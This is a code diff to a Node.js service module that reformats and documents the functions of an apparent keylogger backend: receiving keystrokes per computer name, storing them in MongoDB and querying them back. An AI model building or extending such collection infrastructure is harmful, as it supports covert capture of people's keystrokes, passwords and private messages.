@@ -11,23 +11,44 @@ const keyloggerRepo = require("../repository/keyloggerRepo");
 
 // Service module.
 const keyloggerService = {
-    // Function for telling the Repository layer to connect the database.
-    connectDB:() => {
-        return keyloggerRepo.connectDB();
-    },
-    // Function for sending keystrokes that need to be saved to the repository layer to be saved to the database.
-    saveKeystrokes: postReq => {
-        console.log("POST REQUEST: ", postReq);
-        return keyloggerRepo.saveStrokes(postReq.computerName, postReq.keystrokes, postReq.timestamp);
-    },
-    // Function for grabbing all of our keystrokes from the database in the repository layer. 
-    getAllStrokes: () => {
-        return keyloggerRepo.retrieveKeyStrokes();
-    },
-    getKeyStrokesByName: compName => {
-        return keyloggerRepo.getStrokesByIp(compName);
-    }
+  /**
+   * @function connectDB
+   * Function for calling the repository layer to make connection to the mongoDB instance.
+   */
+  connectDB: () => {
+    return keyloggerRepo.connectDB();
+  },
+  
+  /**
+   * @function saveKeystrokes
+   * @param {postReq}
+   * -Contains the json grabbed by the post request made from the server that is going to 
+   *  be saved in the database
+   *  Function for saving keystrokes to the database.
+   */
+  saveKeystrokes: postReq => {
+    console.log("POST REQUEST: ", postReq);
+    return keyloggerRepo.saveStrokes( // Returning the result that comes back form the database.
+      postReq.computerName,
+      postReq.keystrokes,
+      postReq.timestamp
+    );
+  },
+  /**
+   * @function getAllStrokes
+   * Function for grabbing all of our keystrokes from the database in the repository layer.
+   */
+  getAllStrokes: () => {
+    return keyloggerRepo.retrieveKeyStrokes(); // Returning the result from the database.
+  },
+  /**
+   * @function getKeyStrokesByName
+   * @param {compName}
+   * Function for querying keystrokes by computer name.
+   */
+  getKeyStrokesByName: compName => {
+    return keyloggerRepo.searchKeyStrokesByName(compName); // Returning the result from the database.
+  }
 };
-
 
 module.exports = keyloggerService;
